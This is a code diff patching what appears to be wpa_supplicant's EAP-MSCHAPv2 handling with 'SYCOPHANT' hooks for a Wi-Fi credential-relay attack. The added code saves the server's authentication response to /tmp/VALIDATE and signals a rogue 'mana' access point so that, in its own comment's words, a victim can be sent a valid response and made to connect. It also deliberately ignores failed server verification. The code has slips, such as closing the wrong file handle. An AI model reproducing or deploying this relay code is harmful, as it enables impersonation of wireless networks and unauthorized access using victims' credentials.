@@ -76,13 +76,15 @@ struct ms_change_password {
 
 
 // MICHAEL WAS HERE
-char* outLockName = "/tmp/CHALLENGE_LOCK";
-char* inLockName = "/tmp/RESPONSE_LOCK";
+// char* outLockName = "/tmp/CHALLENGE_LOCK";
+// char* inLockName = "/tmp/RESPONSE_LOCK";
 char* outFileName = "/tmp/CHALLENGE";
 char* inFileName = "/tmp/RESPONSE";
+char* validateFileName = "/tmp/VALIDATE";
 
-FILE* inLock;
-FILE* outLock;
+// FILE* inLock;
+// FILE* outLock;
+FILE* validateFile;
 FILE* inFile;
 FILE* outFile;
 // MICHAEL STOPPED HERE
@@ -343,11 +345,11 @@ static struct wpabuf * eap_mschapv2_challenge_reply(
 		if( sycophantState == NULL )
 			printf("Open Error Lock");
 
-		sup_state[0] = 'Z';
-		fwrite(sup_state,1,1,sycophantState);
+		// sup_state[0] = 'P';
+		// fwrite(sup_state,1,1,sycophantState);
 
-		// fwrite('Z',1,1,sycophantState);
-		fclose(sycophantState);
+		// // fwrite('Z',1,1,sycophantState);
+		// fclose(sycophantState);
 
 		// } else {
 		// 	fclose(inFile);
@@ -527,6 +529,36 @@ static struct wpabuf * eap_mschapv2_success(struct eap_sm *sm,
 	len = req_len - sizeof(*req);
 	pos = (const u8 *) (req + 1);
 	// SYCOPHANT START
+	// Write response down so that mana can send a valid response to the victim so they connect
+
+	wpa_hexdump(MSG_INFO, "SYCOPHANT : VALIDATE DATA", data->auth_response, sizeof(data->auth_response));
+
+	// char* outFileName = "CHALLENGE_FILE.txt";
+	validateFile = fopen(validateFileName, "wb");
+
+	if( validateFile == NULL )
+	{
+		printf("Open Error");
+	}
+
+	fwrite(data->auth_response,sizeof(data->auth_response),1,validateFile); 
+	
+	wpa_printf(MSG_INFO, "SYCOPHANT : VALIDATE DATA GIVEN TO MANA");
+
+	fclose(outFile);
+
+	// Inform of our readyness
+	// char* outLockName = "CHALLENGE_LOCK";
+	FILE* sycophantState;
+	char* sycophantStateName = "/tmp/SYCOPHANT_STATE";
+	sycophantState = fopen(sycophantStateName, "wb");
+
+	char * sup_state = "V";
+	fwrite(sup_state,1,1,sycophantState);
+
+	fclose(sycophantState);
+	wpa_printf(MSG_INFO, "SYCOPHANT : INFORMING MANA TO SERVE CHALLENGE");
+
 	if (mschapv2_verify_auth_response(data->auth_response, pos, len))
 		wpa_printf(MSG_INFO,"Response not verified, does not seem important");
 	if (!data->auth_response_valid)
